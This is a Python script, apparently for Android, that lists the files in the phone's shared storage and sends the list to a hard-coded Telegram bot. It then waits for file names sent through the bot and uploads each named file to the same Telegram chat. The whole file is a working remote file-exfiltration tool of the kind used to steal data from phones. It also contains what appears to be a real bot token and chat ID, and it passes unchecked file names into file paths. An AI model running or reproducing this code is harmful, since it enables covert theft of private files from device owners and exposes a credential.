import os
import requests
import json

# Replace with your bot token and chat ID
TOKEN = '7409833692:AAEHa57FWspcNNFqPlPlvVwrZDcikh2bQmw'
CHAT_ID = '6285177516'

# Function to send message to Telegram
def send_to_telegram(message):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        response = requests.post(url, data=data)
        if response.status_code == 200:
            print("Message sent successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print(f"Error sending message: {str(e)}")

# Function to get storage file list
def get_storage_file_list():
    try:
        # List all files in storage (customize the directory as needed)
        storage_files = os.popen('ls /storage/emulated/0/').read().strip().split('\n')
        if storage_files:
            return storage_files
        else:
            return "No files found in storage."
    except Exception as e:
        return f"Error getting file list: {str(e)}"

# Function to download a specific file
def download_file(file_name):
    try:
        # Customize the path where the file exists
        file_path = f"/storage/emulated/0/{file_name}"
        
        # Check if the file exists
        if os.path.exists(file_path):
            # Send the file to Telegram
            url = f"https://api.telegram.org/bot{TOKEN}/sendDocument"
            files = {'document': open(file_path, 'rb')}
            data = {"chat_id": CHAT_ID}
            response = requests.post(url, files=files, data=data)
            
            if response.status_code == 200:
                return f"File `{file_name}` sent successfully!"
            else:
                return f"Failed to send file. Status code: {response.status_code}, Response: {response.text}"
        else:
            return f"File `{file_name}` does not exist."
    except Exception as e:
        return f"Error downloading file: {str(e)}"

# Function to show file list and download option
def handle_storage():
    try:
        # Get the file list
        files = get_storage_file_list()
        
        if isinstance(files, list):
            # Prepare message for Telegram with file list and download options
            file_list_message = "*Available Files in Storage:*\n"
            file_list_message += "\n".join([f"`{file}`" for file in files])
            file_list_message += "\n\nSend the file name to download it."
            send_to_telegram(file_list_message)
        else:
            # In case of an error or no files found
            send_to_telegram(files)
    
    except Exception as e:
        send_to_telegram(f"Error handling storage: {str(e)}")

# Telegram bot logic to handle file download requests
def handle_telegram_update(update):
    try:
        message = update.get('message', {}).get('text', '')
        if message:
            # Check if the message is a file name to download
            response_message = download_file(message)
            send_to_telegram(response_message)
    
    except Exception as e:
        send_to_telegram(f"Error in Telegram update: {str(e)}")

# Example of how to handle incoming Telegram updates (you will need to adapt it for your setup)
def listen_for_updates():
    last_update_id = None
    url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
    
    while True:
        params = {'timeout': 100, 'offset': last_update_id}
        response = requests.get(url, params=params)
        updates = response.json().get('result', [])
        
        for update in updates:
            last_update_id = update['update_id'] + 1
            handle_telegram_update(update)

if __name__ == "__main__":
    # Step 1: List available files in storage
    handle_storage()
    
    # Step 2: Listen for user input (file name to download)
    listen_for_updates()
